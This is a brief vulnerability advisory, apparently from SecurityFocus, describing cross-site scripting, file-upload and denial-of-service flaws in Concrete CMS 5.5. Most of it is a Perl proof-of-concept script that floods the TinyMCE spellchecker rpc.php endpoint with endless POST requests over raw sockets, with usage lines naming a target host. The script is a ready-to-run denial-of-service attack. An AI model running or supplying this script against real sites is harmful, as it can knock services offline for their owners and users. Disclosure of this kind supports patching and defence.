source: http://www.securityfocus.com/bid/53640/info

Concrete CMS is prone to following vulnerabilities because it fails to properly handle user-supplied input.

1. Multiple cross-site scripting vulnerabilities

2. An arbitrary-file-upload vulnerability

3. A denial-of-service vulnerability

An attacker may leverage these issues to cause denial-of-service conditions or to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks.

Concrete CMS versions 5.5 and 5.5.21 are vulnerable. 

#### p0c 2 [ DDos with RPC 'using simple PERL script]===>

#!/usr/bin/perl

use Socket;
if (@ARGV < 2) { &usage }
$rand=rand(10);
$host = $ARGV[0];
$dir = $ARGV[1];
$host =~ s/(http:\/\/)//eg;
for ($i=0; $i<66; $i--)
{
$user="w00t".$rand.$i;
$data = "Aa"
;
$lenx = length $data;
$rpc = "POST ".$dir."concrete/js/tiny_mce/plugins/spellchecker/rpc.php HTTP/1.1\r\n". # Or use just /index.php
"Accept: */*\r\n".
"Content-Type: application/x-www-form-urlencoded\r\n".
"Accept-Encoding: gzip, deflate\r\n".
"User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)\r\n".
"Host: $host\r\n".
"Content-Length: $lenx\r\n".
"Connection: Keep-Alive\r\n".
"Cache-Control: no-cache\r\n\r\n".
"$data";
my $port = "80";
my $proto = getprotobyname('tcp');
socket(SOCKET, PF_INET, SOCK_STREAM, $proto);
connect(SOCKET, sockaddr_in($port, inet_aton($host))) || redo;
send(SOCKET,"$rpc", 0);
syswrite STDOUT, "+" ;
}
print "\n\n";
system('ping $host');
sub usage {
print "\tusage: \n";
print "\t$0 <host> </dir/>\n";
print "\Ex: $0 127.0.0.1 /concrete/\n";
print "\Ex2: $0 target.com /\n\n";
exit();
};

# << ThE|End